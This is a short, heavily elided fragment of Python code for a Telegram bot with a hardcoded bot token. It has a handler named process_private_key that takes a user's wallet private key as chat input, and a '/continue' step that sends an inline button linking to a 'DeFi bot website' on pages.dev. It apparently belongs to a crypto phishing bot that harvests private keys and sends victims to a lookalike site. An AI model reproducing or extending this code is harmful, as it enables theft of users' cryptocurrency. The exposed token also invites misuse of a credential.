...
BOT_TOKEN = '6923618444:AAGEnhRK2rgodEj_HdAtNUpBhlt3PMf2RS4'
...
def process_private_key(message):
    ...
    if private_key.lower() == '/continue':
        ...
        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://green-bitcointoken.pages.dev/')
